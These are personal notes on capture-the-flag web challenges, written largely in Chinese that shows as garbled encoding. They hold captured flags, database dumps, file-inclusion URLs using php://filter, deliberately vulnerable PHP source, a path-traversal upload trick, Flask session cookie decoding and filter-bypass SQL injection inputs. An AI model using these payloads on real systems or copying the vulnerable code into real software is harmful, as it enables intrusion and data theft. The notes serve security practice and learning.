

å¯¹æ–°åŠ ã€ä¿®æ”¹çš„å†…å®¹æ ¼å¤–æ³¨æ„ï¼Œæµ‹è¯•é€»è¾‘æ˜¯å¦æ­£ç¡®å®ç°ã€‚
åœ¨å‡ºé”™çš„åœ°æ–¹å¾ˆå®¹æ˜“å†çŠ¯é”™ã€‚

* Introduction
  å…ˆè·å¾—å®Œæ•´çš„åŠŸèƒ½åˆ—è¡¨ï¼Œç„¶ååƒæ”»å‡»è€…ä¸€æ ·æ€è€ƒï¼Œè®¾å®šä¸€ä¸ªç›®çš„ï¼Œæƒ³è¾¾åˆ°ä»€ä¹ˆæ ·çš„æ•ˆæœã€‚
  è®¾å®šç›®æ ‡ä¼˜å…ˆçº§ã€‚

* Encrypted Pastebin
^FLAG^a810c4f2706848f951204afdf6b9a46458a76cfd50b16d9d0cabca04a25c1e71$FLAG$
Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode('utf8'))
  File "./common.py", line 46, in decryptLink
    data = b64d(data)
  File "./common.py", line 11, in <lambda>
    b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))
  File "/usr/local/lib/python2.7/base64.py", line 328, in decodestring
    return binascii.a2b_base64(s)
Error: Incorrect padding

Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode('utf8'))
  File "./common.py", line 48, in decryptLink
    cipher = AES.new(staticKey, AES.MODE_CBC, iv)
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 95, in new
    return AESCipher(key, *args, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 59, in __init__
    blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py", line 141, in __init__
    self._cipher = factory.new(key, *args, **kwargs)
ValueError: IV must be 16 bytes long


* File Inclusion
  php warning: include() failed to open stream
  
  
* Photo Gallery
Database: level5                       
Table: photos                                          
[3 entries]   
+----+------------------+--------+------------------------------------------------------------------+
| id | title            | parent | filename                    |   
+----+------------------+--------+------------------------------------------------------------------+
| 1  | Utterly adorable | 1      | files/adorable.jpg                    |
| 2  | Purrfect         | 1      | files/purrfect.jpg                    |
| 3  | Invisible        | 1      | 81e78101746ae78a93868a529b3ad715136761e29594d8f750953f0880981d9c |
+----+------------------+--------+------------------------------------------------------------------+

Database: level5         
Table: albums                    
[1 entry]               
+----+---------+                          
| id | title   |        
+----+---------+ 
| 1  | Kittens |

* Cody's First Blog
  å¿ƒå¾—ï¼Œé€šè¿‡ä¸æ–­çš„è¯•é”™ï¼Œä¼šä¸æ–­å¾€æ­£ç¡®çš„è·¯çº¿é æ‹¢ï¼Œopen mindã€‚æç¤ºæ˜¯å¾ˆé‡è¦çš„ï¼Œ
  è¦æ³¨æ„é”™è¯¯æç¤ºçš„ç»†èŠ‚ï¼Œæ„ä¹‰æœ‰å¾ˆå¤§ä¸åŒã€‚
  æ¯”å¦‚è¿™ä¸ªctf,é™åˆ¶æœåŠ¡å™¨è®¿é—®å¤–ç½‘ï¼Œé™åˆ¶phpæ–‡ä»¶å†™å…¥ï¼Œå¹¶é™åˆ¶é™¤äº†httpä»¥å¤–çš„æ–‡ä»¶åŒ…å«ï¼Œé€ æˆçœ‹ä¸Šå»ä¸èƒ½åˆ©ç”¨ã€‚
  ç»†å¿ƒæ³¨æ„é”™è¯¯æç¤ºçš„ä¸åŒï¼Œå°±èƒ½æ‰¾åˆ°çº¿ç´¢ã€‚

  æ³¨æ„ä»£ç è¿è¡Œçš„ç¯å¢ƒï¼Œé…ç½®ä¹Ÿå¾ˆé‡è¦ã€‚

  http://35.190.155.168:5001/ee2b7eb1b5/?page=http://www.bing.com/test
 <b>Notice</b>:  Undefined variable: title in <b>/app/index.php</b> on line <b>30</b><br />
</h1>
		<br />
<b>Warning</b>:  include(): php_network_getaddresses: getaddrinfo failed: Name or service not known in <b>/app/index.php</b> on line <b>21</b><br />
<br />
<b>Warning</b>:  include(http://www.bing.com/test.php): failed to open stream: php_network_getaddresses: getaddrinfo failed: Name or service not known in <b>/app/index.php</b> on line <b>21</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'http://www.bing.com/test.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in <b>/app/index.php</b> on line <b>21</b><br /> 

  æ­¤é¡µé¢æœªä½œéªŒè¯
   /?page=admin.inc

  åŒ…å«localåœ°å€ï¼š
   http://35.190.155.168:5001/33ca0bc2a1/?page=http://127.0.0.1/?page=admin.inc

http://35.190.155.168:5001/33ca0bc2a1/?page=http://127.0.0.1/?page=php://filter/convert.base64-encode/resource=index
   ä¼šæ‰§è¡Œé¦–é¡µæäº¤æ³¨å…¥çš„phpä»£ç ã€‚

   æ²¡æœ‰å†™æ–‡ä»¶ï¼Œè®¿é—®å¤–ç½‘çš„æƒé™ã€‚
   <?php
$a = file_get_contents("index.php");
echo $a;
?>
  ä¸Šé¢çš„ä»£ç ,ä¼šè·å¾—æäº¤commenté¡µé¢ã€‚
#+begin_example  index.php
<?php
	// ^FLAG^5eb6781b20f6b70f4d36556b45fe33af8b4d7281a4ab3befdc62555a79538d03$FLAG$
	mysql_connect("localhost", "root", "");
	mysql_select_db("level4");
	$page = isset($_GET['page']) ? $_GET['page'] : 'home.inc';
	if(strpos($page, ':') !== false && substr($page, 0, 5) !== "http:")
		$page = "home.inc";

	if(isset($_POST['body'])) {
		mysql_query("INSERT INTO comments (page, body, approved) VALUES ('" . mysql_real_escape_string($page) . "', '" . mysql_real_escape_string($_POST['body']) . "', 0)");
		if(strpos($_POST['body'], '<?php') !== false)
			echo '<p>^FLAG^e8dc80f7e9e5bc510d492f30d5cf58d834212d486093dd4e8598ead57c9de6c1$FLAG$</p>';
?>
	<p>Comment submitted and awaiting approval!</p>
	<a href="javascript:window.history.back()">Go back</a>
<?php
		exit();
	}

	ob_start();
	include($page . ".php");
	$body = ob_get_clean();
?>
<!doctype html>
<html>
	<head>
		<title><?php echo $title; ?> -- Cody's First Blog</title>
	</head>
	<body>
		<h1><?php echo $title; ?></h1>
		<?php echo $body; ?>
		<br>
		<br>
		<hr>
		<h3>Comments</h3>
		<!--<a href="?page=admin.auth.inc">Admin login</a>-->
		<h4>Add comment:</h4>
		<form method="POST">
			<textarea rows="4" cols="60" name="body"></textarea><br>
			<input type="submit" value="Submit">
		</form>
<?php
	$q = mysql_query("SELECT body FROM comments WHERE page='" . mysql_real_escape_string($page) . "' AND approved=1");
	while($row = mysql_fetch_assoc($q)) {
		?>
		<hr>
		<p><?php echo $row["body"]; ?></p>
		<?php
	}
?>
	</body>
</html>
#+end_example

#+begin_example home.inc.php
<p>Welcome to my blog!  I'm excited to share my thoughts with the world.  I have many important and controversial positions, which I hope to get across here.</p>

<?php
foreach(scandir("posts", 1) as $value) {
	if($value == "." || $value == "..") continue;
	ob_start();
	include("posts/" . $value);
	$body = ob_get_clean();
	?>
	<h2><?php echo $title; ?></h2>
	<?php
	echo $body;
}
?>

<?php $title = "Home"; ?>

#+end_example


#+begin_example admin.inc.php
<h2>Pending Comments</h2>
<?php
	if(isset($_GET["approve"]))
		mysql_query("UPDATE comments SET approved=1 WHERE id=" . $_GET["approve"]);
	$q = mysql_query("SELECT id, page, body FROM comments WHERE approved=0");
	while($row = mysql_fetch_assoc($q)) {
		?>
		<hr>
		<h3>Comment on <?php echo htmlentities($row["page"]); ?></h3>
		<p><?php echo htmlentities($row["body"]); ?></p>
		<a href="?page=admin.inc&approve=<?php echo $row["id"]; ?>">Approve Comment</a>
		<?php
	}

	$title = "Admin";
?>
#+end_example
* ticketastic
Database: level7
Table: users
[7 entries]
+----+--------------------+----------+
| id | username           | password |
+----+--------------------+----------+
Database: level7                                                         
Table: tickets                                                                                            
[6 entries]                           
| id | body | reply | title |
|----+------+-------+-------|

Set-Cookie: session_level7a=eyJ1c2VyIjoiYWRtaW4ifQ.XEWTDQ.7EGcPbqmlMaWqOlUVIAD4QT7JM8; HttpOnly; Path=/
Set-Cookie: session_level7a=eyJ1c2VyIjoidGVzdCJ9.XEWfwA.s8cUQJXpGfV1F01NOR7T22STv9w; HttpOnly; Path=/
.XEWP0A.nn_-oniMwm-noZ9GotoDfkwiBlE

(first admin-ss)
"eyJ1c2VyIjoiYWRtaW4ifQ.XEW9vg.vpLMmHy5dpSPG-IVgoM_SqB5wHU"

(String. (base64/decode (first admin-ss)))
"{\"user\":\"admin\"}ï¿½[ï¿½à¾’Ì˜|ï¿½vï¿½ï¿½ï¿½ï¿½ï¿½?Jï¿½yï¿½u"
eyJ1c2VyIjoidXRlc3QifQ.XEW-Ng.JRi_2pOjIp9oFzAJMFLIeAQUbO4
flaskçš„sessionç¬¬ä¸€ä¸ªç‚¹å‰é¢çš„æ˜¯payload,base64ç¼–ç ï¼Œå¦‚æœä»¥ç‚¹å¼€å¤´ï¼Œå†ç”¨zlibè§£å‹ã€‚
ä¸­é—´æ˜¯è¿‡æœŸæ—¶é—´ï¼Œæœ€åæ˜¯æœ€é‡è¦çš„æ ¡éªŒï¼Œç”¨APP_KEYåŠ å¯†ï¼Œæ ¹æ®payloadå’Œè¿‡æœŸæ—¶é—´è®¡ç®—ï¼Œè¿›è¡Œæ ¡éªŒã€‚

* sequence
  integer-sequence-learning

* Model E1337 - Rolling Code Lock
  /admin /get-config

* TempImage
  ä¸Šä¼ ä¿®æ”¹æ–‡ä»¶è·¯å¾„../../test.php
  ä¿®æ”¹pngæ–‡ä»¶å†…å®¹ï¼Œphpæ–‡ä»¶å¤´ä¸ä¿®æ”¹ï¼ŒåŒ…å«phpä»£ç ã€‚


* jiandan
  http://ctf5.shiyanbar.com/web/jiandan/index.php

  æäº¤å¤šä¸ªIdå€¼ï¼Œæœ€åä¸€ä¸ªç”Ÿæ•ˆ
  id=unionss&id=test&id=select&submit=Login

  phpæäº¤æ•°ç»„ï¼š
  id[0]=unionss&id[1]=test&id[2]=select&submit=Login
  (string)è½¬æ¢åå˜ä¸º'Array'

   $sql="select * from users limit ".$info['id'].",0";

  test.php
    $id = (string)$_POST['id'];
    if(sqliCheck($id))

function sqliCheck($str){
	if(preg_match("/\\\|,|-|#|=|~|union|like|procedure/i",$str)){
		return 1;
	}
	return 0;
}

   
  åªèƒ½æ„é€ --å‰é¢éƒ¨åˆ†çš„ï¼Œæ— æ³•æ”¹å˜idçš„å€¼
  a:1:{s:2:"id";s: -- 0:"";}
  å¯ä»¥æ„é€ ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œphpç”¨æ•°ç»„è®¿é—®['id']ä¼šè¿”å›ç¬¬ä¸€ä¸ªå­—ç¬¦,åªæœ‰ä¸€ä¸ªå­—ç¬¦ï¼Œæ— æ³•ä½¿ç”¨ã€‚

  ç°åœ¨çŸ¥é“æ¯æ¬¡è§£å¯†åçš„ç»“æœï¼ŒçŸ¥é“åŠ å¯†æ•°æ®ï¼Œç›´æ¥xorå°±å¯ä»¥è·å¾—ä¸­é—´å€¼ï¼Œä¸éœ€è¦oracle,å°±æ˜¯miracleå•Šã€‚

